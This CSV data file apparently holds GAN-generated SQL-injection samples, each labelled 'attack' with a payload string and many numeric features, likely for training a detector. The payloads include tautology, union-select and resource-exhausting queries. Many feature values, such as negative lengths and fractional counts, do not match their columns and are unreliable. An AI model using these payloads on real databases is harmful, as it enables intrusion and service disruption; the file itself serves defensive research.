id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000001,attack,boolean,"1%'   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R004668,8.806790771142579,-38.11420440673828,-3.1410410404205322,16.78851890563965,52.80481719970703,0.6827566623687744,63.45732498168945,8.97281551361084,1.0031744241714478,0.10028044879436493,0.19279281795024872,0.3915199041366577,0.23205585777759552,3.4795522689819336,1.5976613759994507,0.6760359406471252,2.5470123291015625,0.42457687854766846,0.14071807265281677,0.033761974424123764,5.575633525848389,9.368732452392578,0.20876511931419373,0.00450779078528285,1.2508504390716553,0.11625054478645325,-0.10979876667261124,0.8550001978874207,-0.5656421184539795,1.5427894592285156,0.07331914454698563,-0.0017731190891936421,0.5677709579467773,0.1668298989534378,2.00276517868042,0.9047731161117554,-2.427091360092163,0.05079450085759163,-1.2051705121994019,-0.2528388798236847,0.3923548460006714,0.16603799164295197,0.3575054705142975,0.10845901817083359,-0.02091670222580433,0.08105891197919846,0.07159006595611572,-0.16234607994556427,-0.19708211719989777,-0.3803896903991699,-0.2239963710308075,-0.38866111636161804,0.4480741620063782,-0.12420951575040817,-0.024036576971411705,-0.05945642292499542,0.10976844280958176,0.17069728672504425,-0.09701858460903168,-0.0946221649646759,0.005955500062555075,0.8821458220481873,-0.011230257339775562,-0.4105091989040375,0.217354416847229,-0.07149104028940201,-0.4866233170032501,-1.0207598209381104,-0.44716131687164307,-0.0027737796772271395,0.031164074316620827,-0.013367990963160992,0.0014108744217082858,0.02402312681078911,0.0029103239066898823,0.1926937848329544,1.0981197357177734,1.813403844833374,-0.025737985968589783,-0.12468720972537994,-0.24761368334293365,2.9034667015075684,1.4230366945266724,-0.5543103814125061,0.3752576410770416,0.41593894362449646,-0.3324939012527466,0.7648077011108398,0.026979485526680946
GAN_000002,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R005507,4.859252589756344,110.98465728759766,23.518434524536133,27.067899703979492,36.77326202392578,-0.8088215589523315,34.56990051269531,16.96235466003418,1.000200629234314,0.26206082105636597,0.2526502311229706,0.34033894538879395,0.12344980239868164,3.258657217025757,2.6486356258392334,0.47430986166000366,0.5674710869789124,0.3735719621181488,-0.007351365871727467,0.016738206148147583,5.498917102813721,5.796347618103027,2.1903393268585205,-0.004530069883912802,0.6255525350570679,0.018338674679398537,0.03646297752857208,-0.22682346403598785,0.46334442496299744,0.2609265446662903,0.01989567093551159,-0.017448032274842262,0.3314908444881439,0.46423810720443726,0.7083843946456909,1.0743907690048218,-1.588200330734253,0.9812909960746765,0.5938186645507812,0.2109261304140091,0.5151452422142029,0.032479919493198395,0.14861242473125458,0.14288850128650665,0.07390838861465454,0.024660389870405197,0.017278628423810005,0.34116917848587036,0.18714435398578644,0.22180329263210297,0.2067842185497284,0.022632284089922905,0.184950053691864,0.005470994394272566,-0.022355401888489723,0.003734236815944314,0.07027334719896317,0.07164377719163895,-0.0034346727188676596,0.0009006336331367493,0.0035124679561704397,0.31102800369262695,0.009166115894913673,0.4144868552684784,0.09951383620500565,0.04727514460682869,0.010186489671468735,0.037432923913002014,-0.013538384810090065,-0.0029061269015073776,0.001980026951059699,0.0005815282929688692,0.004147870000451803,0.01135044265538454,-0.02345232479274273,0.022175172343850136,0.6074989438056946,0.3492973744869232,-0.0007545330445282161,0.059755049645900726,-0.05944109335541725,3.9222586154937744,0.4296659529209137,0.14269313216209412,0.09725449979305267,0.1352613866329193,-0.02649368904531002,0.010585900396108627,0.04401867464184761
GAN_000003,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  9348  =  9348",nearest_attack_euclidean,R007681,4.415459272122306,152.08853149414062,46.36259841918945,31.486637115478516,58.5055046081543,1.14146888256073,44.74715805053711,23.695877075195312,0.9995805621147156,0.3331446647644043,0.217247873544693,0.3359929919242859,0.12303357571363449,3.4276156425476074,0.6808998584747314,0.5754796266555786,1.2853119373321533,0.14699295163154602,0.02847878821194172,0.03842976316809654,4.303501129150391,7.639732360839844,2.9294636249542236,-0.00855614710599184,0.8759748935699463,0.04860178008675575,0.01035299152135849,0.36653953790664673,0.4489874541759491,0.31041187047958374,0.051497239619493484,0.010791945271193981,-0.2024780809879303,0.26410073041915894,0.759221613407135,1.0815997123718262,3.6818387508392334,0.7835115790367126,0.41806820034980774,0.26580893993377686,0.22231042385101318,0.34813278913497925,0.03606836497783661,0.10647746175527573,0.0056618680246174335,-0.01840454712510109,0.018736107274889946,0.1920471042394638,0.14107674360275269,0.11545172333717346,0.49969014525413513,0.043335672467947006,-0.2053326517343521,0.008691884577274323,0.06917927414178848,0.0018668649718165398,0.021248076111078262,0.062351785600185394,-0.004916568752378225,-0.12965062260627747,0.001663828850723803,0.09516086429357529,-0.0011993246152997017,1.3107259273529053,0.09679627418518066,0.010456576012074947,0.0069032348692417145,-0.06588120758533478,0.22077634930610657,-0.0033163176849484444,0.007942709140479565,0.0001107027565012686,0.0018437720136716962,0.038555022329092026,-0.008682454004883766,0.058353275060653687,0.5061179995536804,0.45572540163993835,0.005099093541502953,0.21765469014644623,0.0740993544459343,5.439647674560547,0.495400995016098,0.20031070709228516,0.0679434984922409,0.027097240090370178,-0.03157215937972069,-0.3265388309955597,0.0152824018150568
GAN_000004,attack,union,"-7565'   )    )    union all select 7745,7745,7745,7745,7745,7745#",nearest_attack_euclidean,R002932,7.28943879012905,4.044648170471191,-28.903430938720703,30.134796142578125,-29.54315948486328,-0.22395536303520203,21.975046157836914,-0.17948533594608307,1.0001775026321411,0.13435308635234833,0.40958401560783386,0.2591744065284729,0.0928683653473854,2.583503007888794,3.0643155574798584,0.006975535303354263,0.6402650475502014,0.5696761608123779,0.10262744128704071,0.009271245449781418,1.875205159187317,2.9106955528259277,2.743345260620117,0.021851392462849617,-0.4069758355617523,0.02796804904937744,-0.01836698316037655,-0.7696797251701355,1.4781306982040405,-0.26566505432128906,-0.01209957990795374,-0.039260149002075195,-0.0430203415453434,0.869476318359375,1.2754173278808594,-0.22449354827404022,-6.944484710693359,0.7026311755180359,-0.07604195177555084,0.8040072321891785,0.826113224029541,-0.7430121898651123,-0.08685686439275742,0.24693360924720764,0.06600064039230347,-0.02644266188144684,0.0282230656594038,0.25715172290802,0.21327410638332367,0.28825798630714417,0.16918931901454926,-0.1821947544813156,-0.1822720319032669,-0.023139571771025658,-0.06818834692239761,0.0018080573063343763,0.060331787914037704,0.46331527829170227,-0.00959676131606102,-0.5516527891159058,0.006679200101643801,1.4934296607971191,0.0206044539809227,-0.5798745155334473,0.14924660325050354,0.0938819870352745,-0.1429038792848587,0.12670230865478516,0.17100341618061066,-0.009493685327470303,-0.04729899391531944,-0.005624482408165932,0.008200225420296192,-0.04463600739836693,-0.03860683739185333,0.12792763113975525,-0.03511413559317589,0.059926267713308334,0.01569267176091671,0.0713096410036087,-0.1918342411518097,1.6354204416275024,0.06008152663707733,0.608970582485199,-0.24238231778144836,0.15499351918697357,-0.06026364490389824,0.03727369382977486,0.1038590520620346
GAN_000005,attack,boolean,1'  )   and 4595  =  4595#,nearest_attack_euclidean,R000972,7.950599986665476,-25.23708152770996,-12.467823028564453,12.667222023010254,-7.494907379150391,0.3921281099319458,12.036504745483398,-1.1430683135986328,1.000769019126892,0.08158139884471893,0.17421230673789978,0.30345073342323303,0.11349932104349136,2.736894130706787,4.916896343231201,-0.04773658141493797,-1.6445107460021973,0.6936331987380981,-0.0436246357858181,-0.04110255092382431,0.8133749961853027,3.233060598373413,0.48234686255455017,0.008088715374469757,-0.14162346720695496,0.04686961695551872,-0.021016372367739677,-0.6705403923988342,1.3498393297195435,0.20545640587806702,-0.08324320614337921,-0.051040541380643845,0.5663616061210632,0.8544904589653015,0.4837919771671295,-0.006566690746694803,-8.863422393798828,1.509068250656128,-0.6587114930152893,0.10724924504756927,0.4403548538684845,-0.07461174577474594,0.46089521050453186,0.16796180605888367,0.16608767211437225,0.01981346122920513,0.05822005495429039,0.37380871176719666,0.28413280844688416,0.20821814239025116,-0.14977017045021057,-0.16239874064922333,0.5118017792701721,-0.054655540734529495,-0.0957316979765892,0.029754914343357086,0.09156621247529984,0.31107473373413086,-0.05185607075691223,-0.442744642496109,0.004548072814941406,1.0359346866607666,0.022359633818268776,-0.9443610906600952,0.15596795082092285,0.10930132120847702,-0.2803131937980652,-0.052385114133358,0.001294529065489769,0.00045108457561582327,-0.05124666914343834,-0.012892183847725391,0.004320530220866203,-0.09129168093204498,-0.04960685223340988,0.08231783658266068,1.168527364730835,-0.1455395221710205,-0.009160887449979782,-0.00585797568783164,-0.30289870500564575,-1.0597368478775024,0.5085471272468567,-0.0313652828335762,0.19655977189540863,0.12267232686281204,-0.09925632923841476,-0.30798280239105225,0.1028774231672287
GAN_000006,attack,boolean,"1   )    )     )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R003411,4.465104353573239,129.2949981689453,48.735294342041016,24.633501052856445,34.1383171081543,0.92160564661026,45.37840270996094,15.9103422164917,0.9996623992919922,0.40931040048599243,0.17244532704353333,0.2322240173816681,0.11971831321716309,3.3567798137664795,-0.1995839923620224,0.5556334257125854,1.862841010093689,0.25287675857543945,0.05411864072084427,-0.0030844821594655514,2.854672431945801,5.7915940284729,4.221916198730469,-0.005309611093252897,0.5181227922439575,0.06233666464686394,-0.03943327069282532,0.34721747040748596,0.1398421823978424,0.5886512994766235,0.01322296541184187,-0.0023300042375922203,-0.2758154571056366,0.15705379843711853,1.1820791959762573,0.5383676290512085,2.153578519821167,0.32527902722358704,0.6682927012443542,0.6158091425895691,0.34860923886299133,0.34989479184150696,0.02940071001648903,0.10450445115566254,-0.010642864741384983,-0.012125678360462189,0.028391022235155106,-0.16721491515636444,0.14472946524620056,0.1466275453567505,0.3671360909938812,-0.041565392166376114,-0.32325059175491333,0.006502402480691671,0.07216650992631912,-0.009714897722005844,0.05144154280424118,0.3246924877166748,-0.017073050141334534,-0.24973565340042114,0.00567990867421031,0.3637661039829254,0.004201896954327822,0.731988787651062,0.132873073220253,-0.006701046135276556,-0.06944671273231506,-0.1591722071170807,0.12087831646203995,-0.0010224904399365187,-0.006693436298519373,0.0009799767285585403,0.0020745303481817245,-0.004120146855711937,-0.0037402440793812275,0.09419862926006317,0.2868445813655853,0.6686582565307617,0.01337491162121296,0.07487154752016068,0.026227308437228203,3.3613288402557373,0.5799488425254822,0.4248192012310028,-0.022582588717341423,0.06275412440299988,-0.08031251281499863,-0.0006962940096855164,0.026199398562312126
GAN_000007,attack,boolean,-8341 or 8571  =  8571--,nearest_attack_euclidean,R001715,6.99525731423241,56.75786590576172,9.328804016113281,30.47471046447754,8.615962982177734,-1.2291271686553955,55.89670181274414,12.61814022064209,1.002075433731079,0.060711756348609924,0.4942971467971802,0.27380451560020447,0.1481442153453827,3.0509331226348877,0.8020135760307312,0.35334351658821106,3.316882371902466,0.2979535758495331,0.12175915390253067,0.12748999893665314,6.623049736022949,4.507140636444092,0.7094349265098572,-0.022821325808763504,0.3295868933200836,0.011622348800301552,-0.0596458725631237,-0.15153475105762482,-0.5428469777107239,0.4039512574672699,0.03589152172207832,-0.02153570018708706,-0.2762130796909332,0.695049524307251,2.021541118621826,0.9320262670516968,-2.388047933578491,-0.035483937710523605,-0.07191421091556549,0.18386335670948029,0.8959753513336182,0.009557701647281647,-0.02044915035367012,0.1508311778306961,-0.0368012897670269,0.056355711072683334,0.012150603346526623,0.0905771404504776,-0.23481245338916779,-0.14761076867580414,0.28366342186927795,-0.5300983190536499,-0.2523888349533081,-0.09304050356149673,-0.023284481838345528,-0.0786094218492508,0.0063860174268484116,0.10588429868221283,0.021102694794535637,0.20162062346935272,0.0067758215591311455,1.1470489501953125,-0.002334069926291704,1.3741246461868286,0.20278248190879822,-0.0017324326327070594,-0.12432302534580231,-0.21243783831596375,0.14617010951042175,-0.01813901588320732,0.05109475925564766,-0.004364349413663149,0.011623132973909378,0.08021329343318939,-0.021072186529636383,0.14486661553382874,-0.526334822177887,1.166894555091858,-0.014261982403695583,-0.0636448860168457,-0.12871746718883514,3.0590085983276367,0.7372034788131714,0.3895265460014343,-0.27819758653640747,0.350304514169693,-0.1986609399318695,0.5708355903625488,0.04465464502573013
GAN_000008,attack,boolean,1'   )    )     )   rlike   (  select   (  case when   (  5855  =  7142  )   then 1 else 0x28 end   )    )    and    (    (     (  'fkhd'  =  'fkhd,nearest_attack_euclidean,R008879,8.353208565803206,199.38165283203125,45.668182373046875,45.967796325683594,72.12364959716797,1.0931353569030762,43.37088394165039,23.561182022094727,0.9994420409202576,0.31097689270973206,0.20695701241493225,0.3760737478733063,0.08111009001731873,2.624846935272217,5.09238862991333,1.5905864238739014,-1.216564655303955,0.3430421054363251,-0.07988844811916351,-0.021506614983081818,8.64649772644043,9.106636047363281,2.890676498413086,0.0096649881452322,0.2809905707836151,0.07582954317331314,0.15305359661579132,-0.40405651926994324,1.5105690956115723,-0.26178473234176636,0.03939548134803772,0.005334747023880482,-0.02582640014588833,1.1067811250686646,0.14651860296726227,0.8793336749076843,-2.75866961479187,1.916200041770935,0.5568310022354126,0.38411760330200195,0.2754470705986023,-0.021521948277950287,-0.0974583700299263,0.33158013224601746,0.19499695301055908,-0.08253249526023865,0.06194036826491356,0.8473658561706543,0.45334649085998535,0.474385529756546,0.8208402991294861,0.2740212082862854,-0.09911218285560608,0.11538571864366531,0.030006203800439835,0.0430188849568367,0.10231243818998337,-0.09862023591995239,-0.01997038535773754,-0.5358099937438965,0.0020281528122723103,0.4128386676311493,0.007488570641726255,-1.2534972429275513,0.25355732440948486,0.10107354074716568,0.05207327753305435,0.8220570087432861,0.3874002695083618,-0.007343446835875511,-0.03750412538647652,0.001760074170306325,-0.00257719773799181,-0.0021186592057347298,-0.018071232363581657,-0.006602815818041563,0.9729517102241516,-0.3595205545425415,0.030064178630709648,0.2333458960056305,-0.002263742731884122,6.378519058227539,0.19999490678310394,-0.08951283246278763,0.005658597685396671,-0.061353184282779694,0.05954965204000473,-0.96650230884552,0.08931218087673187
GAN_000009,attack,boolean,"1""   )    )    or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R006208,5.839886226013157,161.59864807128906,55.83442687988281,29.22762107849121,51.64567565917969,-1.2374745607376099,33.40091323852539,26.066762924194336,1.0005316734313965,0.40819236636161804,0.1980959177017212,0.32902300357818604,0.09860038757324219,3.02000093460083,1.7166786193847656,1.5946052074432373,1.0949695110321045,0.2713726758956909,-0.09797211736440659,0.005137789063155651,10.057785987854004,5.910598278045654,2.995364189147949,-0.003621111623942852,0.0840003713965416,0.06196737289428711,0.11917945742607117,-0.06446753442287445,-0.5274611115455627,0.5724089741706848,0.012993366457521915,0.03597712516784668,-0.24358093738555908,0.2883419096469879,1.0468941926956177,1.3149162530899048,0.716949999332428,0.41529905796051025,1.048282265663147,0.35814961791038513,0.6230015158653259,0.6730673909187317,0.06554193794727325,0.15986141562461853,0.1291268765926361,-0.020163103938102722,0.009364672936499119,0.20924164354801178,0.05458233878016472,0.19182837009429932,0.4417451322078705,-0.05057801678776741,0.01142074167728424,0.06584372371435165,0.023460587486624718,-0.039538126438856125,0.08468145877122879,-0.17611362040042877,0.018953928723931313,-0.05716989189386368,0.0018580193864181638,0.4370460510253906,0.0013208049349486828,0.17624172568321228,0.26808983087539673,0.015541701577603817,-0.0013408100930973887,0.23060862720012665,-0.03034035675227642,-0.011249071918427944,0.04043648764491081,0.0031276976224035025,-0.001442529377527535,0.07088524848222733,-0.005692754406481981,0.04055287688970566,0.2396986186504364,0.5867236852645874,0.0056691598147153854,0.031179243698716164,0.0028128891717642546,3.689335823059082,0.6123673915863037,0.04000832885503769,-0.14841580390930176,0.11217530071735382,-0.03066246770322323,-0.02357460744678974,0.035755760967731476
GAN_000010,attack,boolean,"1'   )    )     )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'ujjr'  =  'ujjr",nearest_attack_euclidean,R001217,8.151850037598543,257.6023864746094,59.3582763671875,42.25809860229492,146.3671875,2.1124942302703857,91.39739990234375,36.333152770996094,0.9998302459716797,0.3775414228439331,0.03141121193766594,0.5527375340461731,0.14092861115932465,3.9348955154418945,3.578447103500366,1.2734261751174927,0.06359963864088058,0.06581401079893112,-0.11409696191549301,-0.014416525140404701,14.129597663879395,17.085458755493164,0.5957769751548767,-0.016303949058055878,2.1791112422943115,0.11465038359165192,0.03843162581324577,0.030594512820243835,1.1285896301269531,0.8832013010978699,0.12939682602882385,0.048487670719623566,0.05591019615530968,0.6101110577583313,0.4743170142173767,2.2203128337860107,1.033013105392456,1.5892888307571411,-0.04797138646245003,-0.2986685037612915,0.5057089328765869,0.7585762143135071,0.33407536149024963,0.325262188911438,0.16996759176254272,0.02375517599284649,0.12730875611305237,0.3988043963909149,0.2674389183521271,0.10825194418430328,0.7195761203765869,0.05731319263577461,0.26869267225265503,0.022781116887927055,0.053761474788188934,0.021365875378251076,0.09984049201011658,-0.35117611289024353,-0.0699262022972107,0.09417691826820374,-0.0023416555486619473,0.14047130942344666,-0.0019509263802319765,0.38383692502975464,0.22446893155574799,0.006910640746355057,-0.19445350766181946,0.049343183636665344,-0.1826462596654892,-0.0038880815263837576,0.015440667979419231,0.0035707971546798944,0.0012521300232037902,0.11530926823616028,-0.030289139598608017,-0.007199614774435759,1.6910492181777954,0.8036678433418274,-0.004827398806810379,0.006117566023021936,-0.07219603657722473,7.643334865570068,1.4755607843399048,-0.8874800801277161,0.6095880270004272,-0.05424797534942627,-0.07157406955957413,0.03972732648253441,0.07741127163171768
